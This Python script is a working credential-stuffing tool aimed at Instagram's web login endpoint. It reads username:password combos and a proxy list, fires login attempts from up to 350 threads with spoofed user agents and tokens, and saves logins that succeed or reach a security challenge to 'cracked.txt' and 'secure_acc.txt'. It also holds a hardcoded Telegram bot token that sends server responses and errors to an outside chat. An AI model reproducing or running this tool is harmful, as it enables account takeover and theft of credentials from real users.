# By T3B
try :
    import requests
    import os
    import sys
    import time
    import threading
    from user_agent import generate_user_agent
    import random 
    import secrets
    import queue
except Exception as e :
    os.system('cls' if os.name == 'nt' else 'clear')
    input(f'(!) LIBRARY ERROR! In- [{e}]')
    sys.exit()




class Brute:
    def __init__(self):
        ''''''
        self.Att = 0 
        self.Error = 0
        self.Bad = 0
        self.Spam = 0 
        self.success = 0 
        self.Bad_Proxies = 0 
        self.Secure = 0
        self.rs = 0
        self.Q = queue.Queue()
        self.url = 'https://www.instagram.com/accounts/login/ajax/'



        self.run = True
        self.red = '\x1b[1;31;40m'
        self.white = '\x1b[1;37;40m'


        try:
            self.proxies = open("proxies.txt",'r').read().splitlines()
            self.length = len(self.proxies)
        except Exception as e:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("(!) Missign FILE- ",e)
            input("exit:")
            sys.exit()

        ''''''
    
    def Send_attack(self,User,Password,DPi,Token,UserAgent):



        before = self.Att
        time.sleep(1)
        self.rs = self.Att - before

        self.data = {

                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{str(time.time())}:{Password}',
                'username': f'{User}'
            }
        


        try:
            R = requests.post(self.url,data=self.data,headers={'authority': 'i.instagram.com',
                    'method': 'POST',
                    'path': '/api/v1/web/accounts/login/ajax/',
                    'scheme': 'https',
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': f'{DPi}',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': f'csrftoken={Token}',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'empty',
                    'user-agent': f'{UserAgent}',
                    'x-csrftoken': f'{Token}',
                    'x-ig-app-id': '936619743392459',},timeout=2)
    
            self.Att+=1
        except requests.exceptions.ProxyError :
            self.Bad_Proxies+=1
        except requests.exceptions.Timeout:
            self.Bad_Proxies+=1
        
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.Q.put(User+":"+Password)
            self.Error+=1

            if ('"authenticated":true') in R.text:
                with open("cracked.txt",'a') as wr:
                    wr.write(User+":"+Password+'\n')
                self.Att+=1
                self.success+=1

            elif ('authenticated":false') in R.text:
                self.Bad+=1
                self.Att+=1


            elif ('challenge') in R.text:
                self.Secure+=1
                self.success+=1
                with open("secure_acc.txt",'a') as wr:
                    wr.write(User+":"+Password+'\n')
                


            elif R.status_code == 429:
                self.Bad+=1
                self.Q.put(User+":"+Password)

           
            elif ('"message"') in R.text and ('Your account has been disabled for violating our terms: http://instagram.com/about/legal/terms/"') in R.text:
                self.Bad+=1
                self.Att+=1
                self.Q.put(User+":"+Password)

            elif ('Sorry, your password was incorrect. Please double-check your password.') in R.text:
                self.Bad+=1
                self.Att+=1
                self.Q.put(User+":"+Password)


            elif ('"generic_request_error"') and ('"Sorry, there was a problem with your request."') in R.text:
                self.Bad+=1
                self.Att+=1
                self.Q.put(User+":"+Password)

            
            elif ('Only one usage of each socket address') in R.text:
                self.Bad_Proxies+=1
                self.Q.put(User+":"+Password)

            
            elif (':"Please wait a few minutes before you try again.",') in R.text:
                self.Bad+=1
                self.Att+=1
                self.Q.put(User+":"+Password)

            elif ('Facebook | Error') and ('-') in R.text:
                self.Bad+=1
                self.Att+=1
                self.Q.put(User+":"+Password)
            else:
                requests.post(f'''https://api.telegram.org/bot5602767599:AAGjS2akZCJsXWx3-uv4AKlbODkH2o4ZQmU/sendMessage?chat_id=5647427919&text=-

                < New Else Exception >

                {R.text}''')

            
            print(f'{self.white}({self.red}!{self.white}) AttempT- {self.Att}\t\t{self.white}({self.red}-{self.white}) Success- {self.success}\t\t{self.white}({self.red}-{self.white}) Secure- {self.Secure}\t\t({self.red}-{self.white}) Bad- {self.Bad}\t\t({self.red}~{self.white}) Bad_Proxies- {self.Bad_Proxies}\t\t({self.red}!{self.white}) R\S- {self.rs}',end='\r')



    def Send(self):
        while self.run:
            try:
                Token = secrets.token_hex(16)
                UserAgent = generate_user_agent()
                Dp = ['321','600','200','150','100']
                DPi = random.choice(Dp)

            except Exception as e:
                requests.post(f'''https://api.telegram.org/bot5602767599:AAGjS2akZCJsXWx3-uv4AKlbODkH2o4ZQmU/sendMessage?chat_id=5647427919&text=-

                < New Else Exception File >

                {e}''')
                break
            try:
 
                i = str(self.Q.get(timeout=2))
            except:
                break


            else: # else 
                try:
                    User,Password = i.split(":")

                except :
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{self.white}({self.red}!{self.white}) Eror With Combo Chack THE Combo is Good!')
                    input(f'exit:')
                    sys.exit()
                else: # else
                    self.Send_attack(User,Password,DPi,Token,UserAgent)
                    self.Q.task_done()
            


    def Speed(self):
        try:
            with open("combo.txt",'r') as reader:

                self.File_combo = reader.read().splitlines()
        except Exception as e :
            os.system('cls' if os.name == 'nt' else 'clear')
            print("(!) Missign FILE- ",e)
            input("exit:")
            sys.exit()
        for self.i in self.File_combo:

            self.Q.put(self.i)

        os.system('cls' if os.name == 'nt' else 'clear')
        threads = int(input(f"{self.white}({self.red}!{self.white}) ThreadS:"))
        if threads > 350 :
            os.system('cls' if os.name == 'nt' else 'clear')
            print('You Can`t Do Higher Then 350')
            input('Exit:')
            sys.exit()
        threads_name = []

        for self.i in range(threads):
            t = threading.Thread(target=self.Send)
            t.daemon = True
            threads_name.append(t)
            t.start()

        for t in threads_name:
            t.join()
        
        print(f"{self.white}({self.red}!{self.white}) -DONE ALL Combo")


Run = Brute()
Run.Send()
Run.Speed()
